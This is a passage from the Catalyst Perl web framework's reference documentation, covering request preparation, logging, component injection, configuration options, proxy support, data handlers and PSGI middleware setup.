)\nGets an action in a given namespace.\n$c->get_actions( $action, $namespace )\nGets all actions of a given name in a namespace and all parent\nnamespaces.\n$app->handle_request( @arguments )\nCalled to handle each HTTP request.\n$class->prepare( @arguments )\nCreates a Catalyst context from an engine-specific request (Apache, CGI,\netc.).\n$c->prepare_action\nPrepares action. See Catalyst::Dispatcher.\n$c->prepare_body\nPrepares message body.\n$c->prepare_body_chunk( $chunk )\nPrepares a chunk of data before sending it to HTTP::Body.\nSee Catalyst::Engine.\n$c->prepare_body_parameters\nPrepares body parameters.\n$c->prepare_connection\nPrepares connection.\n$c->prepare_cookies\nPrepares cookies by ensuring that the attribute on the request\nobject has been built.\n$c->prepare_headers\nPrepares request headers by ensuring that the attribute on the request\nobject has been built.\n$c->prepare_parameters\nPrepares parameters.\n$c->prepare_path\nPrepares path and base.\n$c->prepare_query_parameters\nPrepares query parameters.\n$c->log_request\nWrites information about the request to the debug logs.  This includes:\n\nRequest method, path, and remote IP address\nQuery keywords (see \"query_keywords\" in Catalyst::Request)\nRequest parameters\nFile uploads\n\n$c->log_response\nWrites information about the response to the debug logs by calling\n$c->log_response_status_line and $c->log_response_headers.\n$c->log_response_status_line($response)\nWrites one line of information about the response to the debug logs.  This includes:\n\nResponse status code\nContent-Type header (if present)\nContent-Length header (if present)\n\n$c->log_response_headers($headers);\nHook method which can be wrapped by plugins to log the response headers.\nNo-op in the default implementation.\n$c->log_request_parameters( query => {}, body => {} )\nLogs request parameters to debug logs\n$c->log_request_uploads\nLogs file uploads included in the request to the debug logs.\nThe parameter name, filename, file type, and file size are all included in\nthe debug logs.\n$c->log_request_headers($headers);\nHook method which can be wrapped by plugins to log the request headers.\nNo-op in the default implementation.\n$c->log_headers($type => $headers)\nLogs HTTP::Headers (either request or response) to the debug logs.\n$c->prepare_read\nPrepares the input for reading.\n$c->prepare_request\nPrepares the engine request.\n$c->prepare_uploads\nPrepares uploads.\n$c->prepare_write\nPrepares the output for writing.\n$c->request_class\nReturns or sets the request class. Defaults to Catalyst::Request.\n$app->request_class_traits\nAn arrayref of Moose::Roles which are applied to the request class.  You can\nname the full namespace of the role, or a namespace suffix, which will then\nbe tried against the following standard namespace prefixes.\n$MyApp::TraitFor::Request::$trait_suffix\nCatalyst::TraitFor::Request::$trait_suffix\n\nSo for example if you set:\nMyApp->request_class_traits(['Foo']);\n\nWe try each possible role in turn (and throw an error if none load)\nFoo\nMyApp::TraitFor::Request::Foo\nCatalyst::TraitFor::Request::Foo\n\nThe namespace part 'TraitFor::Request' was chosen to assist in backwards\ncompatibility with CatalystX::RoleApplicator which previously provided\nthese features in a stand alone package.\n$app->composed_request_class\nThis is the request class which has been composed with any request_class_traits.\n$c->response_class\nReturns or sets the response class. Defaults to Catalyst::Response.\n$app->response_class_traits\nAn arrayref of Moose::Roles which are applied to the response class.  You can\nname the full namespace of the role, or a namespace suffix, which will then\nbe tried against the following standard namespace prefixes.\n$MyApp::TraitFor::Response::$trait_suffix\nCatalyst::TraitFor::Response::$trait_suffix\n\nSo for example if you set:\nMyApp->response_class_traits(['Foo']);\n\nWe try each possible role in turn (and throw an error if none load)\nFoo\nMyApp::TraitFor::Response::Foo\nCatalyst::TraitFor::Responset::Foo\n\nThe namespace part 'TraitFor::Response' was chosen to assist in backwards\ncompatibility with CatalystX::RoleApplicator which previously provided\nthese features in a stand alone package.\n$app->composed_response_class\nThis is the request class which has been composed with any response_class_traits.\n$c->read( [$maxlength] )\nReads a chunk of data from the request body. This method is designed to\nbe used in a while loop, reading $maxlength bytes on every call.\n$maxlength defaults to the size of the request if not specified.\nYou have to set MyApp->config(parse_on_demand => 1) to use this\ndirectly.\nWarning: If you use read(), Catalyst will not process the body,\nso you will not be able to access POST parameters or file uploads via\n$c->request.  You must handle all body parsing yourself.\n$c->run\nStarts the engine.\n$c->set_action( $action, $code, $namespace, $attrs )\nSets an action in a given namespace.\n$c->setup_actions($component)\nSets up actions for a component.\n$c->setup_components\nThis method is called internally to set up the application's components.\nIt finds modules by calling the locate_components method, expands them to\npackage names with the expand_component_module method, and then installs\neach component into the application.\nThe setup_components config option is passed to both of the above methods.\nInstallation of each component is performed by the setup_component method,\nbelow.\n$app->setup_injected_components\nCalled by setup_compoents to setup components that are injected.\n$app->setup_injected_component( $injected_component_name, $config )\nSetup a given injected component.\n$app->inject_component($MyApp_Component_name => \\%args);\nAdd a component that is injected at setup:\nMyApp->inject_component( 'Model::Foo' => { from_component => 'Common::Foo' } );\n\nMust be called before ->setup.  Expects a component name for your\ncurrent application and \\%args where\n\n\nfrom_component\nThe target component being injected into your application\n\n\nroles\nAn arrayref of Moose::Roles that are applied to your component.\n\n\nExample\nMyApp->inject_component(\n  'Model::Foo' => {\n    from_component => 'Common::Model::Foo',\n    roles => ['Role1', 'Role2'],\n  });\n\n$app->inject_components\nInject a list of components:\nMyApp->inject_components(\n  'Model::FooOne' => {\n    from_component => 'Common::Model::Foo',\n    roles => ['Role1', 'Role2'],\n  },\n  'Model::FooTwo' => {\n    from_component => 'Common::Model::Foo',\n    roles => ['Role1', 'Role2'],\n  });\n\n$c->locate_components( $setup_component_config )\nThis method is meant to provide a list of component modules that should be\nsetup for the application.  By default, it will use Module::Pluggable.\nSpecify a setup_components config option to pass additional options directly\nto Module::Pluggable. To add additional search paths, specify a key named\nsearch_extra as an array reference. Items in the array beginning with ::\nwill have the application class name prepended to them.\n$c->expand_component_module( $component, $setup_component_config )\nComponents found by locate_components will be passed to this method, which\nis expected to return a list of component (package) names to be set up.\n$app->delayed_setup_component\nReturns a coderef that points to a setup_component instance.  Used\ninternally for when you want to delay setup until the first time\nthe component is called.\n$c->setup_component\n$app->config_for( $component_name )\nReturn the application level configuration (which is not yet merged with any\nlocal component configuration, via $component_class->config) for the named\ncomponent or component object. Example:\nMyApp->config(\n  'Model::Foo' => { a => 1, b => 2},\n);\n\nmy $config = MyApp->config_for('MyApp::Model::Foo');\n\nIn this case $config is the hashref {a=>1, b=>2}.\nThis is also handy for looking up configuration for a plugin, to make sure you follow\nexisting Catalyst standards for where a plugin should put its configuration.\n$c->setup_dispatcher\nSets up dispatcher.\n$c->setup_engine\nSets up engine.\n$c->apply_default_middlewares\nAdds the following Plack middlewares to your application, since they are\nuseful and commonly needed:\nPlack::Middleware::LighttpdScriptNameFix (if you are using Lighttpd),\nPlack::Middleware::IIS6ScriptNameFix (always applied since this middleware\nis smart enough to conditionally apply itself).\nWe will also automatically add Plack::Middleware::ReverseProxy if we notice\nthat your HTTP $env variable REMOTE_ADDR is '127.0.0.1'.  This is usually\nan indication that your server is running behind a proxy frontend.  However in\n2014 this is often not the case.  We preserve this code for backwards compatibility\nhowever I highly recommend that if you are running the server behind a front\nend proxy that you clearly indicate so with the using_frontend_proxy configuration\nsetting to true for your environment configurations that run behind a proxy.  This\nway if you change your front end proxy address someday your code would inexplicably\nstop working as expected.\nAdditionally if we detect we are using Nginx, we add a bit of custom middleware\nto solve some problems with the way that server handles $ENV{PATH_INFO} and\n$ENV{SCRIPT_NAME}.\nPlease NOTE that if you do use using_frontend_proxy the middleware is now\nadding via registered_middleware rather than this method.\nIf you are using Lighttpd or IIS6 you may wish to apply these middlewares.  In\ngeneral this is no longer a common case but we have this here for backward\ncompatibility.\nApp->psgi_app\nApp->to_app\nReturns a PSGI application code reference for the catalyst application\n$c. This is the bare application created without the apply_default_middlewares\nmethod called.  We do however apply registered_middleware since those are\nintegral to how Catalyst functions.  Also, unlike starting your application\nwith a generated server script (via Catalyst::Devel and catalyst.pl) we do\nnot attempt to return a valid PSGI application using any existing ${myapp}.psgi\nscripts in your $HOME directory.\nNOTE apply_default_middlewares was originally created when the first PSGI\nport was done for v5.90000.  These are middlewares that are added to achieve\nbackward compatibility with older applications.  If you start your application\nusing one of the supplied server scripts (generated with Catalyst::Devel and\nthe project skeleton script catalyst.pl) we apply apply_default_middlewares\nautomatically.  This was done so that pre and post PSGI port applications would\nwork the same way.\nThis is what you want to be using to retrieve the PSGI application code\nreference of your Catalyst application for use in a custom .psgi or in your\nown created server modules.\n$c->setup_home\nSets up the home directory.\n$c->setup_encoding\nSets up the input/output encoding. See ENCODING\nhandle_unicode_encoding_exception\nHook to let you customize how encoding errors are handled. By default\nwe just throw an exception and the default error page will pick it up.\nReceives a hashref of debug information. Example of call (from the\nCatalyst internals):\nmy $decoded_after_fail = $c->handle_unicode_encoding_exception({\n      param_value => $value,\n      error_msg => $_,\n      encoding_step => 'params',\n });\n\nThe calling code expects to receive a decoded string or an exception.\nYou can override this for custom handling of unicode errors. By\ndefault we just die. If you want a custom response here, one approach\nis to throw an HTTP style exception, instead of returning a decoded\nstring or throwing a generic exception.\nsub handle_unicode_encoding_exception {\n  my ($c, $params) = @_;\n  HTTP::Exception::BAD_REQUEST->throw(status_message=>$params->{error_msg});\n}\n\nAlternatively you can 'catch' the error, stash it and write handling code later\nin your application:\nsub handle_unicode_encoding_exception {\n  my ($c, $params) = @_;\n  $c->stash(BAD_UNICODE_DATA=>$params);\n  # return a dummy string.\n  return 1;\n}\n\nNOTE:</b> Please keep in mind that once an error like this occurs,\nthe request setup is still ongoing, which means the state of $c and\nrelated context parts like the request and response may not be setup\nup correctly (since we haven't finished the setup yet). If you throw\nan exception the setup is aborted.\n$c->setup_log\nSets up log by instantiating a Catalyst::Log object and\npassing it to log(). Pass in a comma-delimited list of levels to set the\nlog to.\nThis method also installs a debug method that returns a true value into the\ncatalyst subclass if the \"debug\" level is passed in the comma-delimited list,\nor if the $CATALYST_DEBUG environment variable is set to a true value.\nNote that if the log has already been setup, by either a previous call to\nsetup_log or by a call such as __PACKAGE__->log( MyLogger->new ),\nthat this method won't actually set up the log object.\n$c->setup_plugins\nSets up plugins.\n$c->setup_stats\nSets up timing statistics class.\n$c->registered_plugins\nReturns a sorted list of the plugins which have either been stated in the\nimport list.\nIf passed a given plugin name, it will report a boolean value indicating\nwhether or not that plugin is loaded.  A fully qualified name is required if\nthe plugin name does not begin with Catalyst::Plugin::.\nif ($c->registered_plugins('Some::Plugin')) {\n    ...\n}\n\ndefault_middleware\nReturns a list of instantiated PSGI middleware objects which is the default\nmiddleware that is active for this application (taking any configuration\noptions into account, excluding your custom added middleware via the psgi_middleware\nconfiguration option).  You can override this method if you wish to change\nthe default middleware (although do so at risk since some middleware is vital\nto application function.)\nThe current default middleware list is:\n  Catalyst::Middleware::Stash\n  Plack::Middleware::HTTPExceptions\n  Plack::Middleware::RemoveRedundantBody\n  Plack::Middleware::FixMissingBodyInRedirect\n  Plack::Middleware::ContentLength\n  Plack::Middleware::MethodOverride\n  Plack::Middleware::Head\n\nIf the configuration setting using_frontend_proxy is true we add:\n  Plack::Middleware::ReverseProxy\n\nIf the configuration setting using_frontend_proxy_path is true we add:\n  Plack::Middleware::ReverseProxyPath\n\nBut NOTE that Plack::Middleware::ReverseProxyPath is not a dependency of the\nCatalyst distribution so if you want to use this option you should add it to\nyour project distribution file.\nThese middlewares will be added at \"setup_middleware\" during the\n\"setup\" phase of application startup.\nregistered_middlewares\nRead only accessor that returns an array of all the middleware in the order\nthat they were added (which is the REVERSE of the order they will be applied).\nThe values returned will be either instances of Plack::Middleware or of a\ncompatible interface, or a coderef, which is assumed to be inlined middleware\nsetup_middleware (?@middleware)\nRead configuration information stored in configuration key psgi_middleware or\nfrom passed @args.\nSee under \"CONFIGURATION\" information regarding psgi_middleware and how\nto use it to enable Plack::Middleware\nThis method is automatically called during 'setup' of your application, so\nyou really don't need to invoke it.  However you may do so if you find the idea\nof loading middleware via configuration weird :).  For example:\npackage MyApp;\n\nuse Catalyst;\n\n__PACKAGE__->setup_middleware('Head');\n__PACKAGE__->setup;\n\nWhen we read middleware definitions from configuration, we reverse the list\nwhich sounds odd but is likely how you expect it to work if you have prior\nexperience with Plack::Builder or if you previously used the plugin\nCatalyst::Plugin::EnableMiddleware (which is now considered deprecated)\nSo basically your middleware handles an incoming request from the first\nregistered middleware, down and handles the response from the last middleware\nup.\nregistered_data_handlers\nA read only copy of registered Data Handlers returned as a Hash, where each key\nis a content type and each value is a subref that attempts to decode that content\ntype.\nsetup_data_handlers (?@data_handler)\nRead configuration information stored in configuration key data_handlers or\nfrom passed @args.\nSee under \"CONFIGURATION\" information regarding data_handlers.\nThis method is automatically called during 'setup' of your application, so\nyou really don't need to invoke it.\ndefault_data_handlers\nDefault Data Handlers that come bundled with Catalyst.  Currently there are\nonly two default data handlers, for 'application/json' and an alternative to\n'application/x-www-form-urlencoded' which supposed nested form parameters via\nCGI::Struct or via CGI::Struct::XS IF you've installed it.\nThe 'application/json' data handler is used to parse incoming JSON into a Perl\ndata structure.  It uses JSON::MaybeXS.  This allows you to fail back to\nJSON::PP, which is a Pure Perl JSON decoder, and has the smallest dependency\nimpact.\nBecause we don't wish to add more dependencies to Catalyst, if you wish to\nuse this new feature we recommend installing Cpanel::JSON::XS in order to get\nthe best performance.  You should add either to your dependency list\n(Makefile.PL, dist.ini, cpanfile, etc.)\n$c->stack\nReturns an arrayref of the internal execution stack (actions that are\ncurrently executing).\n$c->stats\nReturns the current timing statistics object. By default Catalyst uses\nCatalyst::Stats, but can be set otherwise with\nstats_class.\nEven if -Stats is not enabled, the stats object is still\navailable. By enabling it with $c->stats->enabled(1), it can be used to\nprofile explicitly, although MyApp.pm still won't profile nor output anything\nby itself.\n$c->stats_class\nReturns or sets the stats (timing statistics) class. Catalyst::Stats is used by default.\n$app->stats_class_traits\nA arrayref of Moose::Roles that are applied to the stats_class before creating it.\n$app->composed_stats_class\nthis is the stats_class composed with any 'stats_class_traits'.  You can\nname the full namespace of the role, or a namespace suffix, which will then\nbe tried against the following standard namespace prefixes.\n$MyApp::TraitFor::Stats::$trait_suffix\nCatalyst::TraitFor::Stats::$trait_suffix\n\nSo for example if you set:\nMyApp->stats_class_traits(['Foo']);\n\nWe try each possible role in turn (and throw an error if none load)\nFoo\nMyApp::TraitFor::Stats::Foo\nCatalyst::TraitFor::Stats::Foo\n\nThe namespace part 'TraitFor::Stats' was chosen to assist in backwards\ncompatibility with CatalystX::RoleApplicator which previously provided\nthese features in a stand alone package.\n$c->use_stats\nReturns 1 when stats collection is enabled.\nNote that this is a static method, not an accessor and should be overridden\nby declaring sub use_stats { 1 } in your MyApp.pm, not by calling $c->use_stats(1).\n$c->write( $data )\nWrites $data to the output stream. When using this method directly, you\nwill need to manually set the Content-Length header to the length of\nyour output data, if known.\nversion\nReturns the Catalyst version number. Mostly useful for \"powered by\"\nmessages in template systems.\nCONFIGURATION\nThere are a number of 'base' config variables which can be set:\n\n\nalways_catch_http_exceptions - As of version 5.90060 Catalyst\nrethrows errors conforming to the interface described by\nPlack::Middleware::HTTPExceptions and lets the middleware deal with it.\nSet true to get the deprecated behaviour and have Catalyst catch HTTP exceptions.\n\n\ndefault_model - The default model picked if you say $c->model. See \"$c->model($name)\".\n\n\ndefault_view - The default view to be rendered or returned when $c->view is called. See \"$c->view($name)\".\n\n\ndisable_component_resolution_regex_fallback - Turns\noff the deprecated component resolution functionality so\nthat if any of the component methods (e.g. $c->controller('Foo'))\nare called then regex search will not be attempted on string values and\ninstead undef will be returned.\n\n\nhome - The application home directory. In an uninstalled application,\nthis is the top level application directory. In an installed application,\nthis will be the directory containing MyApp.pm.\n\n\nignore_frontend_proxy - See \"PROXY SUPPORT\"\n\n\nname - The name of the application in debug messages and the debug and\nwelcome screens\n\n\nparse_on_demand - The request body (for example file uploads) will not be parsed\nuntil it is accessed. This allows you to (for example) check authentication (and reject\nthe upload) before actually receiving all the data. See \"ON-DEMAND PARSER\"\n\n\nroot - The root directory for templates. Usually this is just a\nsubdirectory of the home directory, but you can set it to change the\ntemplates to a different directory.\n\n\nsearch_extra - Array reference passed to Module::Pluggable to for additional\nnamespaces from which components will be loaded (and constructed and stored in\n$c->components).\n\n\nshow_internal_actions - If true, causes internal actions such as _DISPATCH\nto be shown in hit debug tables in the test server.\n\n\nuse_request_uri_for_path - Controls if the REQUEST_URI or PATH_INFO environment\nvariable should be used for determining the request path.\nMost web server environments pass the requested path to the application using environment variables,\nfrom which Catalyst has to reconstruct the request base (i.e. the top level path to / in the application,\nexposed as $c->request->base) and the request path below that base.\nThere are two methods of doing this, both of which have advantages and disadvantages. Which method is used\nis determined by the $c->config(use_request_uri_for_path) setting (which can either be true or false).\n\n\nuse_request_uri_for_path => 0\nThis is the default (and the) traditional method that Catalyst has used for determining the path information.\nThe path is generated from a combination of the PATH_INFO and SCRIPT_NAME environment variables.\nThe allows the application to behave correctly when mod_rewrite is being used to redirect requests\ninto the application, as these variables are adjusted by mod_rewrite to take account for the redirect.\nHowever this method has the major disadvantage that it is impossible to correctly decode some elements\nof the path, as RFC 3875 says: \"Unlike a URI path, the PATH_INFO is not URL-encoded, and cannot contain path-segment parameters.\" This means PATH_INFO is always decoded, and therefore Catalyst\ncan't distinguish / vs %2F in paths (in addition to other encoded values).\n\n\nuse_request_uri_for_path => 1\nThis method uses the REQUEST_URI and SCRIPT_NAME environment variables. As REQUEST_URI is never\ndecoded, this means that applications using this mode can correctly handle URIs including the %2F character\n(i.e. with AllowEncodedSlashes set to On in Apache).\nGiven that this method of path resolution is provably more correct, it is recommended that you use\nthis unless you have a specific need to deploy your application in a non-standard environment, and you are\naware of the implications of not being able to handle encoded URI paths correctly.\nHowever it also means that in a number of cases when the app isn't installed directly at a path, but instead\nis having paths rewritten into it (e.g. as a .cgi/fcgi in a public_html directory, with mod_rewrite in a\n.htaccess file, or when SSI is used to rewrite pages into the app, or when sub-paths of the app are exposed\nat other URIs than that which the app is 'normally' based at with mod_rewrite), the resolution of\n$c->request->base will be incorrect.\n\n\n\n\nusing_frontend_proxy - See \"PROXY SUPPORT\".\n\n\nusing_frontend_proxy_path - Enabled Plack::Middleware::ReverseProxyPath on your application (if\ninstalled, otherwise log an error).  This is useful if your application is not running on the\n'root' (or /) of your host server.  NOTE if you use this feature you should add the required\nmiddleware to your project dependency list since its not automatically a dependency of Catalyst.\nThis has been done since not all people need this feature and we wish to restrict the growth of\nCatalyst dependencies.\n\n\nencoding - See \"ENCODING\"\nThis now defaults to 'UTF-8'.  You my turn it off by setting this configuration\nvalue to undef.\n\n\nabort_chain_on_error_fix\nDefaults to true.\nWhen there is an error in an action chain, the default behavior is to\nabort the processing of the remaining actions to avoid running them\nwhen the application is in an unexpected state.\nBefore version 5.90070, the default used to be false. To keep the old\nbehaviour, you can explicitly set the value to false. E.g.\n  __PACKAGE__->config(abort_chain_on_error_fix => 0);\n\nIf this setting is set to false, then the remaining actions are\nperformed and the error is caught at the end of the chain.\n\n\nuse_hash_multivalue_in_request\nIn Catalyst::Request the methods query_parameters, body_parametes\nand parameters return a hashref where values might be scalar or an arrayref\ndepending on the incoming data.  In many cases this can be undesirable as it\nleads one to writing defensive code like the following:\n  my ($val) = ref($c->req->parameters->{a}) ?\n    @{$c->req->parameters->{a}} :\n      $c->req->parameters->{a};\n\nSetting this configuration item to true will make Catalyst populate the\nattributes underlying these methods with an instance of Hash::MultiValue\nwhich is used by Plack::Request and others to solve this very issue.  You\nmay prefer this behavior to the default, if so enable this option (be warned\nif you enable it in a legacy application we are not sure if it is completely\nbackwardly compatible).\n\n\nskip_complex_post_part_handling\nWhen creating body parameters from a POST, if we run into a multipart POST\nthat does not contain uploads, but instead contains inlined complex data\n(very uncommon) we cannot reliably convert that into field => value pairs.  So\ninstead we create an instance of Catalyst::Request::PartData.  If this causes\nissue for you, you can disable this by setting skip_complex_post_part_handling\nto true (default is false).\n\n\nskip_body_param_unicode_decoding\nGenerally we decode incoming POST params based on your declared encoding (the\ndefault for this is to decode UTF-8).  If this is causing you trouble and you\ndo not wish to turn all encoding support off (with the encoding configuration\nparameter) you may disable this step atomically by setting this configuration\nparameter to true.\n\n\ndo_not_decode_query\nIf true, then do not try to character decode any wide characters in your\nrequest URL query or keywords.  Most readings of the relevant specifications\nsuggest these should be UTF-* encoded, which is the default that Catalyst\nwill use, however if you are creating a lot of URLs manually or have external\nevil clients, this might cause you trouble.  If you find the changes introduced\nin Catalyst version 5.90080+ break some of your query code, you may disable\nthe UTF-8 decoding globally using this configuration.\nThis setting takes precedence over default_query_encoding\n\n\ndo_not_check_query_encoding\nCatalyst versions 5.90080 - 5.90106 would decode query parts of an incoming\nrequest but would not raise an exception when the decoding failed due to\nincorrect unicode.  It now does, but if this change is giving you trouble\nyou may disable it by setting this configuration to true.\n\n\ndefault_query_encoding\nBy default we decode query and keywords in your request URL using UTF-8, which\nis our reading of the relevant specifications.  This setting allows one to\nspecify a fixed value for how to decode your query.  You might need this if\nyou are doing a lot of custom encoding of your URLs and not using UTF-8.\n\n\nuse_chained_args_0_special_case\nIn older versions of Catalyst, when more than one action matched the same path\nAND all those matching actions declared Args(0), we'd break the tie by choosing\nthe first action defined.  We now normalized how Args(0) works so that it\nfollows the same rule as Args(N), which is to say when we need to break a tie\nwe choose the LAST action defined.  If this breaks your code and you don't\nhave time to update to follow the new normalized approach, you may set this\nvalue to true and it will globally revert to the original chaining behavior.\n\n\npsgi_middleware - See \"PSGI MIDDLEWARE\".\n\n\ndata_handlers - See \"DATA HANDLERS\".\n\n\nstats_class_traits\nAn arrayref of Moose::Roles that get composed into your stats class.\n\n\nrequest_class_traits\nAn arrayref of Moose::Roles that get composed into your request class.\n\n\nresponse_class_traits\nAn arrayref of Moose::Roles that get composed into your response class.\n\n\ninject_components\nA Hashref of Catalyst::Component subclasses that are 'injected' into configuration.\nFor example:\n  MyApp->config({\n    inject_components => {\n      'Controller::Err' => { from_component => 'Local::Controller::Errors' },\n      'Model::Zoo' => { from_component => 'Local::Model::Foo' },\n      'Model::Foo' => { from_component => 'Local::Model::Foo', roles => ['TestRole'] },\n    },\n    'Controller::Err' => { a => 100, b=>200, namespace=>'error' },\n    'Model::Zoo' => { a => 2 },\n    'Model::Foo' => { a => 100 },\n  });\n\nGenerally Catalyst looks for components in your Model/View or Controller directories.\nHowever for cases when you which to use an existing component and you don't need any\ncustomization (where for when you can apply a role to customize it) you may inject those\ncomponents into your application.  Please note any configuration should be done 'in the\nnormal way', with a key under configuration named after the component affix, as in the\nabove example.\nUsing this type of injection allows you to construct significant amounts of your application\nwith only configuration!.  This may or may not lead to increased code understanding.\nPlease not you may also call the ->inject_components application method as well, although\nyou must do so BEFORE setup.\n\n\nEXCEPTIONS\nGenerally when you throw an exception inside an Action (or somewhere in\nyour stack, such as in a model that an Action is calling) that exception\nis caught by Catalyst and unless you either catch it yourself (via eval\nor something like Try::Tiny or by reviewing the \"error\" stack, it\nwill eventually reach \"finalize_errors\" and return either the debugging\nerror stack page, or the default error page.  However, if your exception\ncan be caught by Plack::Middleware::HTTPExceptions, Catalyst will\ninstead rethrow it so that it can be handled by that middleware (which\nis part of the default middleware).  For example this would allow\nuse HTTP::Throwable::Factory 'http_throw';\n\nsub throws_exception :Local {\n  my ($self, $c) = @_;\n\n  http_throw(SeeOther => { location =>\n    $c->uri_for($self->action_for('redirect')) });\n\n}\n\nINTERNAL ACTIONS\nCatalyst uses internal actions like _DISPATCH, _BEGIN, _AUTO,\n_ACTION, and _END. These are by default not shown in the private\naction table, but you can make them visible with a config parameter.\nMyApp->config(show_internal_actions => 1);\n\nON-DEMAND PARSER\nThe request body is usually parsed at the beginning of a request,\nbut if you want to handle input yourself, you can enable on-demand\nparsing with a config parameter.\nMyApp->config(parse_on_demand => 1);\n\nPROXY SUPPORT\nMany production servers operate using the common double-server approach,\nwith a lightweight frontend web server passing requests to a larger\nbackend server. An application running on the backend server must deal\nwith two problems: the remote user always appears to be 127.0.0.1 and\nthe server's hostname will appear to be localhost regardless of the\nvirtual host that the user connected through.\nCatalyst will automatically detect this situation when you are running\nthe frontend and backend servers on the same machine. The following\nchanges are made to the request.\n$c->req->address is set to the user's real IP address, as read from\nthe HTTP X-Forwarded-For header.\n\nThe host value for $c->req->base and $c->req->uri is set to the real\nhost, as read from the HTTP X-Forwarded-Host header.\n\nAdditionally, you may be running your backend application on an insecure\nconnection (port 80) while your frontend proxy is running under SSL.  If there\nis a discrepancy in the ports, use the HTTP header X-Forwarded-Port to\ntell Catalyst what port the frontend listens on.  This will allow all URIs to\nbe created properly.\nIn the case of passing in:\nX-Forwarded-Port: 443\n\nAll calls to uri_for will result in an https link, as is expected.\nObviously, your web server must support these headers for this to work.\nIn a more complex server farm environment where you may have your\nfrontend proxy server(s) on different machines, you will need to set a\nconfiguration option to tell Catalyst to read the proxied data from the\nheaders.\nMyApp->config(using_frontend_proxy => 1);\n\nIf you do not wish to use the proxy support at all, you may set:\nMyApp->config(ignore_frontend_proxy => 0);\n\nNote about psgi files\nNote that if you supply your own .psgi file, calling\nMyApp->psgi_app(@_);, then this will not happen automatically.\nYou either need to apply Plack::Middleware::ReverseProxy yourself\nin your psgi, for example:\nbuilder {\n    enable \"Plack::Middleware::ReverseProxy\";\n    MyApp->psgi_app\n};\n\nThis will unconditionally add the ReverseProxy support, or you need to call\n$app = MyApp->apply_default_middlewares($app) (to conditionally\napply the support depending upon your config).\nSee Catalyst::PSGI for more information.\nTHREAD SAFETY\nCatalyst has been tested under Apache 2's threading mpm_worker,\nmpm_winnt, and the standalone forking HTTP server on Windows. We\nbelieve the Catalyst core to be thread-safe.\nIf you plan to operate in a threaded environment, remember that all other\nmodules you are using must also be thread-safe. Some modules, most notably\nDBD::SQLite, are not thread-safe.\nDATA HANDLERS\nThe Catalyst::Request object uses HTTP::Body to populate 'classic' HTML\nform parameters and URL search query fields.  However it has become common\nfor various alternative content types to be PUT or POSTed to your controllers\nand actions.  People working on RESTful APIs, or using AJAX often use JSON,\nXML and other content types when communicating with an application server.  In\norder to better support this use case, Catalyst defines a global configuration\noption, data_handlers, which lets you associate a content type with a coderef\nthat parses that content type into something Perl can readily access.\n   package MyApp::Web;\n\n   use Catalyst;\n   use JSON::MaybeXS;\n\n   __PACKAGE__->config(\n     data_handlers => {\n       'application/json' => sub { local $/; decode_json $_->getline },\n     },\n     ## Any other configuration.\n   );\n\n   __PACKAGE__->setup;\n\nBy default Catalyst comes with a generic JSON data handler similar to the\nexample given above, which uses JSON::MaybeXS to provide either JSON::PP\n(a pure Perl, dependency free JSON parser) or Cpanel::JSON::XS if you have\nit installed (if you want the faster XS parser, add it to you project Makefile.PL\nor dist.ini, cpanfile, etc.)\nThe data_handlers configuration is a hashref whose keys are HTTP Content-Types\n(matched against the incoming request type using a regexp such as to be case\ninsensitive) and whose values are coderefs that receive a localized version of\n$_ which is a filehandle object pointing to received body.\nThis feature is considered an early access release and we reserve the right\nto alter the interface in order to provide a performant and secure solution to\nalternative request body content.  Your reports welcomed!\nPSGI MIDDLEWARE\nYou can define middleware, defined as Plack::Middleware or a compatible\ninterface in configuration.  Your middleware definitions are in the form of an\narrayref under the configuration key psgi_middleware.  Here's an example\nwith details to follow:\n   package MyApp::Web;\n\n   use Catalyst;\n   use Plack::Middleware::StackTrace;\n\n   my $stacktrace_middleware = Plack::Middleware::StackTrace->new;\n\n   __PACKAGE__->config(\n     'psgi_middleware', [\n       'Debug',\n       '+MyApp::Custom',\n       $stacktrace_middleware,\n       'Session' => {store => 'File'},\n       sub {\n         my $app = shift;\n         return sub {\n           my $env = shift;\n           $env->{myapp.customkey} = 'helloworld';\n           $app->($env);\n         },\n       },\n     ],\n   );\n\n   __PACKAGE__->setup;\n\nSo the general form is:\n__PACKAGE__->config(psgi_middleware => \\@middleware_definitions);\n\nWhere @middleware is one or more of the following, applied in the REVERSE of\nthe order listed (to make it function similarly to Plack::Builder:\nAlternatively, you may also define middleware by calling the \"setup_middleware\"\npackage method:\npackage MyApp::Web;\n\nuse Catalyst;\n\n__PACKAGE__->setup_middleware( \\@middleware_definitions);\n__PACKAGE__->setup;\n\nIn the case where you do both (use 'setup_middleware' and configuration) the\npackage call to setup_middleware will be applied earlier (in other words its\nmiddleware will wrap closer to the application).  Keep this in mind since in\nsome cases the order of middleware is important.\nThe two approaches are not exclusive.\n\n\nMiddleware Object\nAn already initialized object that conforms to the Plack::Middleware\nspecification:\n     my $stacktrace_middleware = Plack::Middleware::StackTrace->new;\n  \n     __PACKAGE__->config(\n       'psgi_middleware', [\n         $stacktrace_middleware,\n       ]);\n\n\n\ncoderef\nA coderef that is an inlined middleware:\n     __PACKAGE__->config(\n       'psgi_middleware', [\n         sub {\n           my $app = shift;\n           return sub {\n             my $env = shift;\n             if($env->{PATH_INFO} =~m/forced/) {\n               Plack::App::File\n                 ->new(file=>TestApp->path_to(qw/share static forced.txt/))\n                 ->call($env);\n             } else {\n               return $app->($env);\n             }\n          },\n       },\n     ]);\n\n\n\na scalar\nWe assume the scalar refers to a namespace after normalizing it using the\nfollowing rules:\n(1) If the scalar is prefixed with a \"+\" (as in +MyApp::Foo) then the full string\nis assumed to be 'as is', and we just install and use the middleware.\n(2) If the scalar begins with \"Plack::Middleware\" or your application namespace\n(the package name of your Catalyst application subclass), we also assume then\nthat it is a full namespace, and use it.\n(3) Lastly, we then assume that the scalar is a partial namespace, and attempt to\nresolve it first by looking for it under your application namespace (for example\nif you application is \"MyApp::Web\" and the scalar is \"MyMiddleware\", we'd look\nunder \"MyApp::Web::Middleware::MyMiddleware\") and if we don't find it there, we\nwill then look under the regular Plack::Middleware namespace (i.e. for the\nprevious we'd try \"Plack::Middleware::MyMiddleware\").  We look under your application\nnamespace first to let you 'override' common Plack::Middleware locally, should\nyou find that a good idea.\nExamples:\n     package MyApp::Web;\n\n     __PACKAGE__->config(\n       'psgi_middleware', [\n         'Debug',  ## MyAppWeb::Middleware::Debug->wrap or Plack::Middleware::Debug->wrap\n         'Plack::Middleware::Stacktrace', ## Plack::Middleware::Stacktrace->wrap\n         '+MyApp::Custom',  ## MyApp::Custom->wrap\n       ],\n     );\n\n\n\na scalar followed by a 